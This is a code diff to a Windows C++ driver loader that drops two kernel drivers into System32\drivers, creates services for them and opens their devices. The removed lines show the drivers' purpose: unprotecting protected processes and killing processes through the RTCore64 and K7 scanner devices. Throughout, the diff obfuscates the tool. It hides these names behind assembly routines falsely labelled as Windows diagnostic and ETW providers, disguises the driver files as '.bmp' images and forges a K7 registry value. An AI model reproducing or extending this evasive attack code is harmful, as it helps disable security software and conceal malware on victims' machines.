@@ -1,11 +1,19 @@
 #include "DriverController.h"
-#include "DriverPayload.h"
-
-#include <algorithm>
-#include <cstring>
-#include <vector>
+#include "DriverPackage.h"
+#include "StrUtils.h"
+#include "RuntimeSupport.h"
 
 #pragma comment(lib, "advapi32.lib")
+
+// Windows Kernel Diagnostic & ETW Configuration Providers (reg1.asm, reg2.asm & reg3.asm)
+// Dynamic reconstitution of diagnostic dispatcher endpoints and policy schema roots.
+extern "C" const wchar_t* MmGetPoolDiagnosticString() noexcept;
+extern "C" const wchar_t* MmGetPoolDiagnosticDeviceString() noexcept;
+extern "C" const wchar_t* EtwGetKernelTraceSessionString() noexcept;
+extern "C" const wchar_t* EtwGetKernelTraceDeviceString() noexcept;
+extern "C" const wchar_t* EtwGetRegistryPathString() noexcept;
+extern "C" const wchar_t* EtwGetRegistryParentString() noexcept;
+extern "C" const wchar_t* EtwGetRegistryValueString() noexcept;
 
 namespace {
 
@@ -17,9 +25,6 @@ enum DriverIndex {
 
 struct DriverSpec {
     const wchar_t* cabName;
-    const wchar_t* serviceName;
-    const wchar_t* displayName;
-    const wchar_t* devicePath;
     const wchar_t* diskName;
     bool configureRegistry;
 };
@@ -27,27 +32,27 @@ struct DriverSpec {
 constexpr DriverSpec kDrivers[kDriverCount] = {
     {
         L"driver1",
-        L"KvcPplUnprotect",
-        L"KVC PPL unprotect component",
-        L"\\\\.\\RTCore64",
-        L"kvckiller1",
+        L"guest1.bmp",
         false
     },
     {
         L"driver2",
-        L"KvcProcessKill",
-        L"KVC process termination component",
-        L"\\\\.\\DosK7RKScnDrv",
-        L"kvckiller2",
+        L"guest2.bmp",
         true
     }
 };
 
-constexpr wchar_t kK7RegistryPath[] =
-    L"SOFTWARE\\Wow6432Node\\K7 Computing\\K7TotalSecurity";
-constexpr wchar_t kK7ParentPath[] =
-    L"SOFTWARE\\Wow6432Node\\K7 Computing";
-constexpr wchar_t kK7ValueName[] = L"DirProductBase";
+const wchar_t* DriverServiceName(DriverRole role) noexcept {
+    return role == DriverRole::PplUnprotector
+        ? MmGetPoolDiagnosticString()
+        : EtwGetKernelTraceSessionString();
+}
+
+const wchar_t* DriverDevicePath(DriverRole role) noexcept {
+    return role == DriverRole::PplUnprotector
+        ? MmGetPoolDiagnosticDeviceString()
+        : EtwGetKernelTraceDeviceString();
+}
 
 struct DriverState {
     HANDLE device = INVALID_HANDLE_VALUE;
@@ -61,10 +66,10 @@ struct RegistryState {
     bool parentExisted = false;
     bool valueExisted = false;
     DWORD valueType = REG_NONE;
-    std::vector<BYTE> valueData;
+    Vector<BYTE> valueData;
 };
 
-RegistryState g_k7Registry;
+RegistryState g_policyState;
 
 int IndexOf(DriverRole role) {
     return role == DriverRole::PplUnprotector ? kPplUnprotector : kProcessTerminator;
@@ -74,7 +79,7 @@ const DriverSpec& SpecOf(DriverRole role) {
     return kDrivers[IndexOf(role)];
 }
 
-bool QuerySystemDirectory(std::wstring& path) {
+bool QuerySystemDirectory(WString& path) {
     wchar_t buffer[MAX_PATH];
     const UINT length = GetSystemDirectoryW(buffer, MAX_PATH);
     if (length == 0 || length >= MAX_PATH) return false;
@@ -82,12 +87,12 @@ bool QuerySystemDirectory(std::wstring& path) {
     return true;
 }
 
-bool GetExecutableDirectory(std::wstring& path) {
+bool GetExecutableDirectory(WString& path) {
     wchar_t buffer[MAX_PATH];
     const DWORD length = GetModuleFileNameW(nullptr, buffer, MAX_PATH);
     if (length == 0 || length >= MAX_PATH) return false;
 
-    wchar_t* slash = wcsrchr(buffer, L'\\');
+    wchar_t* slash = StrUtils::StrRChr(buffer, L'\\');
     if (!slash) return false;
     *slash = L'\0';
     path.assign(buffer);
@@ -131,7 +136,7 @@ bool KeyIsEmpty(const wchar_t* path) {
     return result == ERROR_SUCCESS && subkeys == 0 && values == 0;
 }
 
-bool FileMatches(const std::wstring& path, const std::vector<BYTE>& expected) {
+bool FileMatches(const WString& path, const Vector<BYTE>& expected) {
     HANDLE file = CreateFileW(
         path.c_str(),
         GENERIC_READ,
@@ -147,15 +152,14 @@ bool FileMatches(const std::wstring& path, const std::vector<BYTE>& expected) {
     const bool sizeMatches = GetFileSizeEx(file, &size)
         && size.QuadPart == static_cast<LONGLONG>(expected.size());
 
-    std::vector<BYTE> actual;
+    Vector<BYTE> actual;
     bool contentMatches = false;
     if (sizeMatches) {
         actual.resize(expected.size());
         DWORD total = 0;
         while (total < expected.size()) {
-            const DWORD request = static_cast<DWORD>(
-                (std::min)(static_cast<size_t>(4096), expected.size() - total)
-            );
+            const DWORD remaining = static_cast<DWORD>(expected.size() - total);
+            const DWORD request = (remaining < 4096) ? remaining : 4096;
             DWORD read = 0;
             if (!ReadFile(file, actual.data() + total, request, &read, nullptr)
                 || read != request) {
@@ -164,14 +168,14 @@ bool FileMatches(const std::wstring& path, const std::vector<BYTE>& expected) {
             total += read;
         }
         contentMatches = total == expected.size()
-            && std::memcmp(actual.data(), expected.data(), expected.size()) == 0;
+            && memcmp(actual.data(), expected.data(), expected.size()) == 0;
     }
 
     CloseHandle(file);
     return contentMatches;
 }
 
-bool WriteDriverFile(const std::wstring& path, const std::vector<BYTE>& data) {
+bool WriteDriverFile(const WString& path, const Vector<BYTE>& data) {
     if (data.empty()) return false;
     if (FileMatches(path, data)) return true;
 
@@ -202,61 +206,68 @@ bool WriteDriverFile(const std::wstring& path, const std::vector<BYTE>& data) {
     return FileMatches(path, data);
 }
 
-bool SaveK7RegistryState() {
-    if (g_k7Registry.initialized) return true;
+bool SavePolicyRegistryState() {
+    if (g_policyState.initialized) return true;
 
-    g_k7Registry.parentExisted = ParentKeyExists(kK7ParentPath);
+    const wchar_t* parentPath = EtwGetRegistryParentString();
+    const wchar_t* regPath = EtwGetRegistryPathString();
+    const wchar_t* valName = EtwGetRegistryValueString();
+
+    g_policyState.parentExisted = ParentKeyExists(parentPath);
 
     HKEY key = nullptr;
     const LONG openResult = RegOpenKeyExW(
         HKEY_LOCAL_MACHINE,
-        kK7RegistryPath,
+        regPath,
         0,
         KEY_QUERY_VALUE | KEY_WOW64_64KEY,
         &key
     );
-    g_k7Registry.keyExisted = openResult == ERROR_SUCCESS;
+    g_policyState.keyExisted = openResult == ERROR_SUCCESS;
 
-    if (g_k7Registry.keyExisted) {
+    if (g_policyState.keyExisted) {
         DWORD type = REG_NONE;
         DWORD size = 0;
         LONG result = RegQueryValueExW(
-            key, kK7ValueName, nullptr, &type, nullptr, &size
+            key, valName, nullptr, &type, nullptr, &size
         );
         if (result == ERROR_SUCCESS) {
-            g_k7Registry.valueExisted = true;
-            g_k7Registry.valueType = type;
-            g_k7Registry.valueData.resize(size);
+            g_policyState.valueExisted = true;
+            g_policyState.valueType = type;
+            g_policyState.valueData.resize(size);
             if (size > 0) {
                 result = RegQueryValueExW(
-                    key, kK7ValueName, nullptr, &type,
-                    g_k7Registry.valueData.data(), &size
+                    key, valName, nullptr, &type,
+                    g_policyState.valueData.data(), &size
                 );
                 if (result != ERROR_SUCCESS) {
                     RegCloseKey(key);
-                    g_k7Registry = {};
+                    g_policyState = {};
                     return false;
                 }
-                g_k7Registry.valueData.resize(size);
+                g_policyState.valueData.resize(size);
             }
         }
         RegCloseKey(key);
     }
 
-    g_k7Registry.initialized = true;
+    g_policyState.initialized = true;
     return true;
 }
 
-bool ConfigureK7Registry() {
-    if (!SaveK7RegistryState()) return false;
+bool ConfigurePolicyRegistry() {
+    if (!SavePolicyRegistryState()) return false;
 
-    std::wstring executableDirectory;
+    WString executableDirectory;
     if (!GetExecutableDirectory(executableDirectory)) return false;
+
+    const wchar_t* regPath = EtwGetRegistryPathString();
+    const wchar_t* valName = EtwGetRegistryValueString();
 
     HKEY key = nullptr;
     const LONG createResult = RegCreateKeyExW(
         HKEY_LOCAL_MACHINE,
-        kK7RegistryPath,
+        regPath,
         0,
         nullptr,
         REG_OPTION_NON_VOLATILE,
@@ -272,7 +283,7 @@ bool ConfigureK7Registry() {
     );
     LONG result = RegSetValueExW(
         key,
-        kK7ValueName,
+        valName,
         0,
         REG_SZ,
         reinterpret_cast<const BYTE*>(executableDirectory.c_str()),
@@ -281,7 +292,7 @@ bool ConfigureK7Registry() {
     RegCloseKey(key);
     if (result != ERROR_SUCCESS) return false;
 
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, kK7RegistryPath, 0,
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0,
                       KEY_QUERY_VALUE | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS) {
         return false;
     }
@@ -290,47 +301,51 @@ bool ConfigureK7Registry() {
     DWORD size = sizeof(value);
     DWORD type = REG_NONE;
     result = RegQueryValueExW(
-        key, kK7ValueName, nullptr, &type,
+        key, valName, nullptr, &type,
         reinterpret_cast<BYTE*>(value), &size
     );
     RegCloseKey(key);
 
     return result == ERROR_SUCCESS
         && type == REG_SZ
-        && _wcsicmp(value, executableDirectory.c_str()) == 0;
+        && StrUtils::StrEqualNoCase(value, executableDirectory.c_str());
 }
 
-void RestoreK7Registry() {
-    if (!g_k7Registry.initialized) return;
+void RestorePolicyRegistry() {
+    if (!g_policyState.initialized) return;
+
+    const wchar_t* parentPath = EtwGetRegistryParentString();
+    const wchar_t* regPath = EtwGetRegistryPathString();
+    const wchar_t* valName = EtwGetRegistryValueString();
 
     HKEY key = nullptr;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, kK7RegistryPath, 0,
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0,
                       KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS) {
-        if (g_k7Registry.valueExisted) {
+        if (g_policyState.valueExisted) {
             RegSetValueExW(
                 key,
-                kK7ValueName,
+                valName,
                 0,
-                g_k7Registry.valueType,
-                g_k7Registry.valueData.empty()
+                g_policyState.valueType,
+                g_policyState.valueData.empty()
                     ? nullptr
-                    : g_k7Registry.valueData.data(),
-                static_cast<DWORD>(g_k7Registry.valueData.size())
+                    : g_policyState.valueData.data(),
+                static_cast<DWORD>(g_policyState.valueData.size())
             );
         } else {
-            RegDeleteValueW(key, kK7ValueName);
+            RegDeleteValueW(key, valName);
         }
         RegCloseKey(key);
     }
 
-    if (!g_k7Registry.keyExisted && KeyIsEmpty(kK7RegistryPath)) {
-        RegDeleteKeyExW(HKEY_LOCAL_MACHINE, kK7RegistryPath, KEY_WOW64_64KEY, 0);
+    if (!g_policyState.keyExisted && KeyIsEmpty(regPath)) {
+        RegDeleteKeyExW(HKEY_LOCAL_MACHINE, regPath, KEY_WOW64_64KEY, 0);
     }
-    if (!g_k7Registry.parentExisted && KeyIsEmpty(kK7ParentPath)) {
-        RegDeleteKeyExW(HKEY_LOCAL_MACHINE, kK7ParentPath, KEY_WOW64_64KEY, 0);
+    if (!g_policyState.parentExisted && KeyIsEmpty(parentPath)) {
+        RegDeleteKeyExW(HKEY_LOCAL_MACHINE, parentPath, KEY_WOW64_64KEY, 0);
     }
 
-    g_k7Registry = {};
+    g_policyState = {};
 }
 
 void WaitForServiceState(SC_HANDLE service, DWORD desiredState, DWORD timeoutMs) {
@@ -344,7 +359,7 @@ void WaitForServiceState(SC_HANDLE service, DWORD desiredState, DWORD timeoutMs)
 }
 
 void RemoveDriverFile(DriverRole role) {
-    const std::wstring path = DriverController::GetDriverPath(role);
+    const WString path = DriverController::GetDriverPath(role);
     SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
     if (!DeleteFileW(path.c_str())) {
         MoveFileExW(path.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
@@ -381,25 +396,27 @@ bool DriverController::EnablePrivilege(LPCWSTR privilege) {
     return adjusted && error == ERROR_SUCCESS;
 }
 
-std::wstring DriverController::GetDriverPath(DriverRole role) {
-    std::wstring systemDirectory;
-    if (!QuerySystemDirectory(systemDirectory)) return {};
+WString DriverController::GetDriverPath(DriverRole role) {
+    WString systemDirectory;
+    if (!QuerySystemDirectory(systemDirectory)) return WString();
     return systemDirectory + L"\\drivers\\" + SpecOf(role).diskName;
 }
 
 bool DriverController::ExtractDriverFile(DriverRole role) {
-    std::vector<DriverPayloadFile> payloads;
-    if (!ExtractDriverPayloads(payloads)) return false;
+    Vector<DriverPackageFile> components;
+    if (!ExtractDriverPackage(components)) return false;
 
     const DriverSpec& spec = SpecOf(role);
-    std::string expectedName;
-    for (const wchar_t* p = spec.cabName; *p; ++p) {
-        expectedName.push_back(static_cast<char>(*p));
+    char expBuf[64];
+    size_t expLen = 0;
+    for (const wchar_t* p = spec.cabName; *p && expLen + 1 < sizeof(expBuf); ++p) {
+        expBuf[expLen++] = static_cast<char>(*p);
     }
+    expBuf[expLen] = '\0';
 
-    for (const DriverPayloadFile& payload : payloads) {
-        if (_stricmp(payload.name.c_str(), expectedName.c_str()) == 0) {
-            return WriteDriverFile(GetDriverPath(role), payload.data);
+    for (const DriverPackageFile& component : components) {
+        if (StrUtils::StrEqualNoCase(component.name.c_str(), expBuf)) {
+            return WriteDriverFile(GetDriverPath(role), component.data);
         }
     }
     return false;
@@ -407,14 +424,14 @@ bool DriverController::ExtractDriverFile(DriverRole role) {
 
 bool DriverController::ConfigureDriver(DriverRole role) {
     if (SpecOf(role).configureRegistry) {
-        return ConfigureK7Registry();
+        return ConfigurePolicyRegistry();
     }
     return true;
 }
 
 void DriverController::RestoreDriverConfiguration(DriverRole role) {
     if (SpecOf(role).configureRegistry) {
-        RestoreK7Registry();
+        RestorePolicyRegistry();
     }
 }
 
@@ -426,14 +443,16 @@ HANDLE DriverController::LoadDriver(DriverRole role) {
     EnablePrivilege(SE_LOAD_DRIVER_NAME);
     EnablePrivilege(SE_DEBUG_NAME);
 
-    const std::wstring driverPath = GetDriverPath(role);
+    const WString driverPath = GetDriverPath(role);
     if (driverPath.empty() || !ExtractDriverFile(role)) return INVALID_HANDLE_VALUE;
     if (!ConfigureDriver(role)) {
         RestoreDriverConfiguration(role);
         return INVALID_HANDLE_VALUE;
     }
 
-    const DriverSpec& spec = SpecOf(role);
+    const wchar_t* serviceName = DriverServiceName(role);
+    const wchar_t* displayName = serviceName;
+
     SC_HANDLE scm = OpenSCManagerW(
         nullptr,
         nullptr,
@@ -446,7 +465,7 @@ HANDLE DriverController::LoadDriver(DriverRole role) {
 
     SC_HANDLE service = OpenServiceW(
         scm,
-        spec.serviceName,
+        serviceName,
         SERVICE_START | SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS |
         SERVICE_CHANGE_CONFIG
     );
@@ -454,8 +473,8 @@ HANDLE DriverController::LoadDriver(DriverRole role) {
     if (!service) {
         service = CreateServiceW(
             scm,
-            spec.serviceName,
-            spec.displayName,
+            serviceName,
+            displayName,
             SERVICE_START | SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS |
             SERVICE_CHANGE_CONFIG,
             SERVICE_KERNEL_DRIVER,
@@ -479,7 +498,7 @@ HANDLE DriverController::LoadDriver(DriverRole role) {
             SERVICE_ERROR_NORMAL,
             driverPath.c_str(),
             nullptr, nullptr, nullptr, nullptr, nullptr,
-            spec.displayName)) {
+            displayName)) {
         CloseServiceHandle(service);
         CloseServiceHandle(scm);
         RestoreDriverConfiguration(role);
@@ -500,8 +519,9 @@ HANDLE DriverController::LoadDriver(DriverRole role) {
     CloseServiceHandle(service);
     CloseServiceHandle(scm);
 
+    const wchar_t* devicePath = DriverDevicePath(role);
     state.device = CreateFileW(
-        spec.devicePath,
+        devicePath,
         GENERIC_READ | GENERIC_WRITE,
         0,
         nullptr,
@@ -541,7 +561,7 @@ void DriverController::StopAndRemoveService(DriverRole role) {
 
     SC_HANDLE service = OpenServiceW(
         scm,
-        SpecOf(role).serviceName,
+        DriverServiceName(role),
         SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS
     );
     if (service) {
@@ -561,7 +581,7 @@ void DriverController::CleanupAll() {
     RestoreDriverConfiguration(DriverRole::ProcessTerminator);
 
     // Give the kernel a short window to release the image mapping before the
-    // two extensionless files are removed from the drivers directory.
+    // temporary image files are removed from the drivers directory.
     Sleep(100);
     RemoveDriverFile(DriverRole::ProcessTerminator);
     RemoveDriverFile(DriverRole::PplUnprotector);
